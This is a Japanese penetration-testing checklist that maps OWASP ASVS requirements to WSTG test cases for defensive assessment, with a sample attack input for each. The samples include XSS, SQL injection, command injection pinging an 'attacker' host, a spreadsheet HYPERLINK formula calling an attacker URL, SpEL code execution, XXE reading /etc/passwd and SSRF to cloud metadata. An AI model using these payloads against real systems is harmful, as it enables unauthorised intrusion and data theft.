## V1.1 エンコーディングおよびサニタイゼーションアーキテクチャ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V1.1.1 | L2 | 入力は一度だけ標準形式にデコード／アンエスケープされ、処理前に行うこと（入力バリデーション後に行わない）。 | 部分対応 | 入力のエンコード経路観察、二重デコードの検出（リクエスト差分／侵入テスト） | 実装確認やログ参照があると確実。 | WSTG-INPV-01 | `%253Cscript%253Ealert(1)%253C/script%253E` を送信し二重デコードで `<script>` 実行 | 単一エンコードと二重エンコードの挙動差／反射位置でスクリプト実行を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting |
| V1.1.2 | L2 | 出力エンコーディング／エスケープは最終ステップで行うこと（インタプリタに渡す直前）。 | 部分対応 | 出力のエンコード方法の検証（反射・保存型ペイロードで確認） | ライブラリ自動エスケープの有無はホワイトボックスで評価すると良い。 | WSTG-INPV-02 | 掲示板に `<img src=x onerror=alert(1)>` を保存し表示時に実行 | 保存→閲覧で未エスケープにより XSS が発火する事実を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting |

---

## V1.2 インジェクション防御

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V1.2.1 | L1 | HTML/HTTP/CSS/コメント等、各コンテキストに応じた出力エンコードを行うこと。 | 対応可 | XSS向けペイロードテスト、レスポンスコンテキスト解析 | ブラウザ実行コンテキストで確認可能。 | WSTG-INPV-01 | `"><script>alert(1)</script>` を各入力で反射確認 | 反射位置（HTML本文/属性/JS）別に実行可否を観察しエンコード欠如を特定 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting |
| V1.2.2 | L1 | 動的URL構築時はコンテキストに応じたエンコードを行い、危険なプロトコルを許可しない。 | 対応可 | URL生成点のパラメータ操作、プロトコルスキーム検証（javascript:, data: 等拒否） | リダイレクト、open-redirect 諸検査で併せて確認。 | WSTG-CLNT-04 | `next=//evil.tld` や `next=javascript:alert(1)` で遷移/実行誘発 | 外部ドメイン遷移や危険スキーム受理の事実を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect |
| V1.2.3 | L1 | 動的に構築する JS/JSON コンテンツは構造を破壊しないようにエンコードすること（JS/JSON 注入防止）。 | 対応可 | JSON/JS を出力するエンドポイントに対するインジェクションテスト | ブラウザ/解析ツールで確認。 | WSTG-CLNT-02 | JSON値に `";alert(1);//` を混入させスクリプト実行を狙う | 生成スクリプトの構文崩壊や実行発火を観察し不適切エンコードを特定 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution |
| V1.2.4 | L1 | DB クエリはパラメータ化／ORM 等で保護し、SQL インジェクションを防ぐこと。 | 対応可 | SQLi ペイロード（盲目含む）、エラーベース／時間差検査 | 一部はホワイトボックス/ログ参照で確証。 | WSTG-INPV-05 | `' OR 1=1--`、`'\|\|pg_sleep(5)\|\|'` 等で抽出/遅延を誘発 | レスポンス差/時間差/エラー情報からクエリ介入の成立を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection |
| V1.2.5 | L1 | OS コマンド呼び出しは適切に保護（パラメータ化やエンコード）されていること。 | 部分対応 | コマンドインジェクションペイロードによる検査（入力→外部影響確認） | 実行環境や出力確認が必要なため限定的。 | WSTG-INPV-12 | `;sleep 5;#` や `& ping -c 1 attacker` 等で時間/外部呼出し検証 | 応答遅延や OOB 監視でコマンド実行の事実を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection |
| V1.2.6 | L2 | LDAP インジェクション対策が施されていること。 | 部分対応 | LDAP クエリに関する入力を用いた検査（LDAP ベースの機能が存在する場合） | LDAP サービス利用有無に依存。 | WSTG-INPV-06 | `*)(\|(uid=*))` 等でフィルタ合成し認証回避 | 結果件数の異常や認証回避でフィルタ注入成立を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection |
| V1.2.7 | L2 | XPath/XQuery 等に対するパラメータ化・保護を行うこと。 | 部分対応 | XML/XPath を利用する機能に対するペイロード検査 | サービス構成確認が有効。 | WSTG-INPV-09 | `a' or '1'='1` / `] \| * \| a[1=1]` 等で照合回避 | 認証/検索結果の不正拡大で XPath 注入を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection |
| V1.2.8 | L2 | LaTeX 等外部プロセッサは安全に構成（例: shell-escape 無効）されること。 | 範囲外 | 設定確認を推奨（ドキュメント生成機能が対象の場合は限定検査） | ビルド／環境の確認が必要。 | - | - | - | - |
| V1.2.9 | L2 | 正規表現内の特殊文字を適切にエスケープして誤解釈を防ぐこと。 | 部分対応 | 正規表現処理を伴う入力処理の挙動確認（ReDoS 予兆の検査） | ReDoS は負荷試験注意。 | WSTG-INPV-11 | 入力に `.*$` や `(\w+)+$` などを混入し意図外マッチ/評価遅延を誘発 | 想定外のマッチ成立や顕著な処理遅延を観測し不適切な正規表現処理を特定 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection |
| V1.2.10 | L3 | CSV／スプレッドシートインジェクション対策（RFC4180 準拠、先頭特殊文字をクオート等）。 | 部分対応 | CSV エクスポート機能に対するフィールド先頭文字検査（エクスポート結果の検査） | エクスポート確認はステージングで慎重に実施。 | WSTG-BUSL-09 | `=HYPERLINK("http://attacker","X")` や `@SUM(1,1)` をセル先頭に含む値を登録→エクスポート | 表計算ソフトで式評価・リンク外出し等が発生する事実を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |

## V1.3 サニタイゼーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V1.3.1 | L1 | WYSIWYG 等からの HTML は既知の安全なサニタイズライブラリで処理すること。 | 対応可 | 保存型 XSS の検証、サニタイズ漏れテスト | DOMPurify 等の利用確認は実装確認で確実に。 | 4.7.2 / WSTG-INPV-02 | WYSIWYG に `<img src=x onerror=alert(1)>` を保存 | 別ユーザで閲覧して JS 実行（保存型 XSS の発火）を確認。反映箇所の出力エスケープ有無を確認。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting |
| V1.3.2 | L1 | eval() や SpEL 等の動的コード実行を使用しない／使用時は入力をサニタイズすること。 | 部分対応 | 動的評価が疑われる箇所のペイロード検査（危険箇所の発見） | 使用有無の把握はホワイトボックスで明確化。 | 4.7.11 / WSTG-INPV-11 | `${T(java.lang.Runtime).getRuntime().exec('id')}` 等の SpEL を入力に混入 | 式評価が行われる入力点へ送信し、サーバ側の実行/例外や機能逸脱の発生を観測。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection |
| V1.3.3 | L2 | 危険なコンテキストへ渡すデータは事前サニタイズ・長さ制限等を実施すること。 | 部分対応 | 長さや許可文字検査、入力整合性の確認 | 実装依存。 | 4.7.1 / WSTG-INPV-01 | `q="><script>alert(1)</script>` をパラメータに付与 | 反射表示でスクリプト実行が起こるか（反射型 XSS）を確認。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting |
| V1.3.4 | L2 | SVG 等スクリプト可能コンテンツはスクリプトや foreignObject を含まないよう検証／サニタイズすること。 | 部分対応 | SVG を受け付ける機能に対する検査（表示と挙動） | ブラウザ差異に注意。 | 4.10.9 | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>` をアップロード | 表示時にスクリプトが実行されないこと、危険要素（script/foreignObject）が除去されることを確認。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files |
| V1.3.5 | L2 | Markdown/CSS/XSL/BBCode 等はサニタイズまたは無効化すること。 | 部分対応 | ユーザ生成コンテンツのレンダリング経路でのインジェクション検査 | 変換パイプライン確認が必要。 | 4.11.3, 4.11.5 | Markdown の `[x](javascript:alert(1))`、スタイル挿入 `color=red;}</style><script>alert(1)</script>` 等 | レンダリング結果で意図しない HTML/CSS が反映・実行されないか確認（許可タグ/属性の制限確認）。 | HTML Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection<br>CSS Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection |
| V1.3.6 | L2 | SSRF 対策としてプロトコル・ドメイン・パス・ポートの許可リスト検証とサニタイズを行うこと。 | 部分対応 | SSRF ペイロード／外部接続検証（リクエスト先制御の検査） | 内部ネットワークへの影響に注意（テスト合意必要）。 | 4.7.19 / WSTG-INPV-19 | `url=http://169.254.169.254/latest/meta-data/`、`gopher://...` 等 | 内部向けリソースへのアクセス可否や応答差分、DNS/リクエストログを確認（SSRF 成立）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery |
| V1.3.7 | L2 | テンプレート生成をユーザ入力ベースで動的に許可しないこと。 | 部分対応 | テンプレートエンジン利用箇所のテンプレート注入検査 | 実行環境での確認推奨。 | 4.7.18 / WSTG-INPV-18 | `{{7*7}}` や `{{().__class__.__mro__}}` 等（エンジン依存） | 出力に演算結果が出る/オブジェクト走査が可能か等のレスポンス変化で SSTI を判定。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection |
| V1.3.8 | L2 | JNDI クエリ等は信頼できない入力をサニタイズし安全に構成すること。 | 部分対応 | JNDI 利用箇所があればテンプレート注入等を検査 | 利用有無の確認が必須。 | 4.7.6 / WSTG-INPV-06 | `(&(uid=admin)(\|(uid=*)))` 等でフィルタを拡張 | 認証/検索結果が想定外に拡張されるかを観測（LDAP インジェクション）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection |
| V1.3.9 | L2 | memcache 送信前のサニタイズを行いインジェクションを防ぐこと。 | 部分対応 | キャッシュに関連する入力の検査（キャッシュ汚染の観察） | 実運用ログ参照で確証。 | 4.7.17 / WSTG-INPV-17 | `Host: attacker.com` などでキャッシュ汚染（パスワードリセットリンク等の生成元改変） | 複数クライアントから同一 URL 取得で汚染コンテンツが配信されることを確認（Web Cache Poisoning）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection |
| V1.3.10 | L2 | フォーマット文字列が予期せぬ解決をしないよう事前サニタイズすること。 | 部分対応 | フォーマット処理を伴う機能の入力検査 | 実行時の挙動確認が重要。 | 4.7.13 / WSTG-INPV-13 | `%x%x%x` や `%n` をログ/テンプレータに渡す | 例外・情報漏えい・クラッシュ等の発生を確認（フォーマット文字列インジェクション）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection |
| V1.3.11 | L2 | SMTP/IMAP 等メール注入対策のため、メール送信前のサニタイズを行うこと。 | 部分対応 | メール送信機能の入力検査（ヘッダ注入等） | 実送信は注意。ステージングで検査推奨。 | 4.7.10 / WSTG-INPV-10 | ヘッダに `\r\nBcc: victim@example.com`、IMAP コマンド挿入 | ヘッダ改変/コマンド実行・誤配送やリレー発生の有無を確認。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection |
| V1.3.12 | L3 | 正規表現による ReDoS を防ぐため、指数的バックトラッキング要素がないことを保証すること。 | 範囲外（負荷試験注意） | ReDoS 予兆検査（負荷試験的手法） | 負荷試験は事前合意必須。 | - | - | - | - |

---

## V1.4 メモリ、文字列、アンマネージドコード

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V1.4.1 | L2 | メモリ安全な文字列操作／安全なメモリコピー等を使用してバッファオーバーフローを防ぐこと。 | 範囲外 | バイナリ／ビルド検査が必要（WebPT は限定的） | バイナリ解析や静的解析が必要。 | - | - | - | - |
| V1.4.2 | L2 | 整数オーバーフロー防止のため符号・範囲・バリデーションを行うこと。 | 範囲外 | 実装／ビルド確認推奨 | ブラックボックスでは判定困難。 | - | - | - | - |
| V1.4.3 | L2 | 動的メモリ解放とダングリングポインタ対策（use-after-free 防止）。 | 範囲外 | 主に開発時／ビルド時検査対象 | WebPT 範囲外（ソース/ビルド確認）。 | - | - | - | - |

---

## V1.5 安全なデシリアライゼーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | 対象のWSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| V1.5.1 | L1 | XML パーサを制限構成にして XXE 等を防止する（外部エンティティ無効化等）。 | 対応可 | XXE 攻撃ペイロードによる検査（XML エンドポイント） | パーサ設定確認はホワイトボックスで確実。 | 4.7.7 / WSTG-INPV-07 | `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>` | エンドポイントに送信し外部エンティティ解決や内部ファイル露出・外部通信の有無を確認。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection |
| V1.5.2 | L2 | デシリアライズ時は型ホワイトリスト等で許可型を限定し、安全でないメカニズムは信頼できない入力で使用しない。 | 部分対応 | デシリアライズ対象の入力を操作して異常挙動検査（挙動検証） | 実行時のオブジェクト生成経路の把握が有用。 | 4.7.11 / WSTG-INPV-11 | Java のシリアライズオブジェクト（例: ysoserial/CommonsCollections1）を送付 | サーバ側の例外/挙動変化や任意コード実行の兆候を確認（安全な検証環境で）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection |
| V1.5.3 | L3 | 各種パーサ（JSON/XML/URL）が同一の解析・エンコードを行うよう一貫性を保つこと（相互運用性の問題回避）。 | 部分対応 | 異なるパーサを用いる箇所があれば差分解析の検査 | 実装・設計確認が中心。 | 4.7.4 / WSTG-INPV-04 | `?role=user&role=admin`／`a=1; a=2` 等の重複/汚染でバックエンドとフロントの解釈差を誘発 | 最初/最後勝ちや配列化などのパース差で権限や処理結果が変わるかを確認（HPP）。 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution |


# V2 バリデーションとビジネスロジック
---

## V2.1 バリデーションとビジネスロジックドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V2.1.1 | L1 | 期待される構造に対する入力バリデーションルールを文書化 | 範囲外 | ドキュメント要求・ヒアリングで確認 | 文書管理プロセスの有無を確認 | - | - | - | - |
| V2.1.2 | L2 | 組合せデータの論理・コンテキスト整合の検証手順を文書化 | 範囲外 | 同上 | 例：地区と郵便番号の整合 | - | - | - | - |
| V2.1.3 | L2 | ユーザ別/全体のビジネス制限・バリデーション期待事項を文書化 | 範囲外 | 同上 | 権限別ルールの明記 | - | - | - | - |

---

## V2.2 入力バリデーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V2.2.1 | L1 | 肯定的バリデーション（許容値/パターン/範囲/構造）を適用 | 部分対応 | 代表入力の境界値/無効値テスト、スキーマ差分検証 | L2以上は全入力対象 | WSTG-INPV-20 | オートバインドを悪用しフォームに無い `role=admin` / `isAdmin=true` を追加 | 非表示/未公開属性を追加送信し反映・権限上昇が起これば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment |
| V2.2.2 | L1 | 信頼できるサーバ側レイヤでバリデーション実施（クライアント依存しない） | 対応可 | クライアント検証バイパス→サーバ側応答確認 | CS側のみ依存の検出 | WSTG-BUSL-02 | GUI非表示のフラグや値を改変して直接POST（例：割引適用フラグの再利用） | プロキシから不正値/隠しパラメータを送信し受理・状態変化すれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests |
| V2.2.3 | L2 | 関連項目の整合チェック（事前定義ルール準拠） | 部分対応 | 相関パラメータ改変での不整合誘発テスト | 例：数量×単価×総額 | WSTG-BUSL-03 | `単価×数量≠請求額` を送信／権限外プロジェクトIDへ差し替え | 相関を壊した入力で保存/反映・権限逸脱が起これば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks |

---

## V2.3 ビジネスロジックのセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V2.3.1 | L1 | 手順省略不可の正しいフロー実行 | 対応可 | ステップスキップ/順序変更の試行 | CSRF/直リンク/強制ブラウジング併用 | WSTG-BUSL-06 | 決済フローを飛ばして確定APIを直叩き／承認前に次工程へ進む | 手順入替/直アクセスで完了や副作用が成立すれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows |
| V2.3.2 | L2 | 文書化されたロジック制限の実装徹底 | 部分対応 | 制限回避シナリオの作成・検証 | 仕様照合が鍵 | WSTG-BUSL-02 | GUIで無効の隠し機能/デバッグフラグを有効化して送信 | 仕様で禁止の値/機能を直接送信し受理・動作すれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests |
| V2.3.3 | L2 | ロジックレベルでのトランザクション整合（成功/ロールバック） | 部分対応 | 中間失敗時の不整合発生有無を確認 | 二重送信/再試行時の挙動 | WSTG-BUSL-06 | 中間で失敗させた後にポイント/在庫が戻らない等の巻戻り不全を誘発 | 途中中断→副作用のロールバック欠如を観測できれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows |
| V2.3.4 | L2 | ロジックロックで限定資源の二重確保防止 | 部分対応 | 競合・同時実行テスト（軽負荷で） | 在庫/枠/座席など | WSTG-BUSL-05 | 座席/在庫の二重予約、割引クーポン複数適用 | 連続/並列実行で上限超過が成立すれば検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits |
| V2.3.5 | L3 | 高価値フローの多者承認 | 範囲外 | 手続/運用設計の確認 | 組織プロセス依存 | - | - | - | - |

---

## V2.4 アンチオートメーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V2.4.1 | L2 | レート制限/クォータ/高コスト機能保護等のアンチオートメーション | 部分対応 | レート超過挙動・CAPTCHA/トークン有無の確認 | 過度な負荷は避ける | WSTG-BUSL-07 | 高速スクリプトで高コストAPI連打/アカウント作成やコード総当たり | しきい値超のレートで送信しブロック/遅延/追加認証が無ければ検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse |
| V2.4.2 | L3 | 人間らしいタイミング要求（過度に速い送信を抑止） | 部分対応 | 連打・自動化送信時の拒否/遅延を確認 | 実装依存が大きい | WSTG-BUSL-04 | 人間では不可能な間隔でフォーム連投／長時間セッション保持で価格固定悪用 | 速すぎる/長時間の操作に対する拒否・タイムアウトが無ければ検出 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing |

## V3.1 Web フロントエンドセキュリティドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.1.1 | L3 | 想定ブラウザの必須セキュリティ機能（HTTPS/HSTS/CSP等）と非対応時の動作をドキュメント化 | 範囲外 | ヒアリング・設計資料入手で確認 | 仕様/運用文書の整備状況を確認 | - | - | - | - |

---

## V3.2 意図しないコンテンツ解釈

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.2.1 | L1 | 不正コンテキストでのレンダリング防止（Sec-Fetch系/Content-Disposition: attachment/CSP sandbox 等） | 対応可 | レスポンスヘッダ/フェッチメタの検証とファイル直参照試験 | ダウンロード/inline挙動を確認 | WSTG-CONF-13 | HTMLを含むユーザアップロードを`Content-Disposition: inline`かつ`nosniff`なしで配信しXSS発火 | `Content-Type/Disposition/CSP`等の有無を確認し、直参照/iframe埋込でスクリプト実行可否を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.2.2 | L1 | テキスト表示は安全API（createTextNode/textContent等）でHTML/JS実行を防止 | 部分対応 | 反射/保存型XSS観点でUI出力の挙動確認 | 実装詳細は黒箱からは限定的 | WSTG-CLNT-01 | 入力をそのまま`innerHTML`に流し`<script>alert(1)</script>`が実行 | 反射/保存箇所でDOM操作先を特定し、DOM型XSSペイロードで実行成立を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-Based_Cross_Site_Scripting |
| V3.2.3 | L3 | DOM clobbering回避（厳密宣言/型/グローバル汚染防止/名前空間分離） | 部分対応 | 既知ペイロードでのUI破壊可否/コンソール警告観察 | 実装確認があると確実 | WSTG-CLNT-02 | フォーム要素名で`window.location`等を上書きしイベントハンドラ挙動を乗っ取り | DOM要素名/ID衝突を誘発する入力でJS実行/挙動変化を観測 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution |

---

## V3.3 クッキーセットアップ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.3.1 | L1 | Secure属性必須。__Host-未使用時は__Secure-を使用 | 対応可 | Set-Cookieの属性/プレフィックス検証 | TLS強制前提 | WSTG-SESS-02 | HTTP経由で`Set-Cookie: session=...; Secure`なし→中間者で漏洩 | すべての`Set-Cookie`に`Secure`が付与されているか、HTTP応答が存在しないかを確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |
| V3.3.2 | L2 | SameSiteを目的に応じて設定（CSRF曝露を低減） | 対応可 | クロスサイト送信/iframe等で挙動確認 | Lax/Strict/None+Secureの整合 | WSTG-SESS-02 | `SameSite`未設定のセッションクッキーで`<form target>`や`<img>`経由のCSRFが成立 | クロスサイトからの自動送信でクッキー送出有無とサーバ側の真正性検証の結果を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |
| V3.3.3 | L2 | 共有不要な機密クッキーは__Host-プレフィックス | 対応可 | ドメイン/Path非指定と併せて検証 | __Host-はSecure/Path=/必須 | WSTG-SESS-02 | サブドメインで緩い`Domain`属性のクッキーを設定し上位ドメインの認証を汚染 | `__Host-`使用の有無、`Domain`未指定/`Path=/`の組合せでスコープ汚染不可を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |
| V3.3.4 | L2 | セッショントークン等はHttpOnlyでJSから不可視 | 対応可 | JSからのアクセス可否/ヘッダ確認 | 二重保管（JS+Cookie）禁止 | WSTG-SESS-02 | `document.cookie`でセッションIDを窃取 | `HttpOnly`付与の有無とJSからの取得可否を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |
| V3.3.5 | L3 | クッキー長（名+値）≤4096B | 部分対応 | 実値の概算・複数クッキーの合計検証 | ブラウザ差異に留意 | WSTG-SESS-02 | 大量/長大なクッキーで送信失敗や切捨て→認証不整合 | `Set-Cookie`総量とブラウザ送信挙動を観察し欠落/切捨ての有無を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes |

---

## V3.4 ブラウザのセキュリティメカニズムヘッダ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 備考 | WSTG番号 | 具体的な攻撃例 | 精査方法(検出とする理由) | WSTGリンク |
| :---: | :---: | :--- | :---: | :--- | :--- | :---: | :--- | :--- | :--- |
| V3.4.1 | L1 | HSTS有効（max-age≥1年）。L2+はincludeSubDomains | 対応可 | すべてのレスポンスでHSTS確認/初回HTTP遮断確認 | preloadはV3.7.4 | WSTG-CONF-13 | 初回アクセスを`http://`で試行しダウングレード許容を確認 | `Strict-Transport-Security`の有無/値、HTTPからの強制HTTPS化を検証 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.4.2 | L1 | CORSの許可は固定or厳密許可リスト。`*`は機密非含有時のみ | 対応可 | ACAO/ACAC/Originの相関確認 | 動的反射の禁止確認 | WSTG-CLNT-09 | `Origin: https://evil.tld`でプリフライト/本リクエストが許可されるか検証 | `ACAO/ACAC/Vary: Origin`等の整合と機密レスポンス暴露の有無を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_Cross_Origin_Resource_Sharing |
| V3.4.3 | L2 | CSP導入（最低：object-src 'none', base-uri 'none'）。L3はナンス/ハッシュで応答ごと | 部分対応 | ポリシー妥当性/違反発生有無を検証 | 実装依存が大きい | WSTG-CONF-13 | `script-src`緩すぎにより外部JS読込やインライン実行が可能 | CSP違反を誘発/観測（レポート/実挙動）し許容範囲を評価 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
| V3.4.4 | L2 | X-Content-Type-Options: nosniff を全レスポンスに付与 | 対応可 | MIMEと実コンテンツ整合/ヘッダ確認 | CORB支援も期待 | WSTG-CONF-13 | `text/plain`と偽装したHTMLが`nosniff`未設定で実行 | ヘッダ有無とブラウザでの解釈差（実行/非実行）を確認 | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-Configuration_and_Deployment_Management_Testing/13-Testing_for_HTTP_Security_Headers |
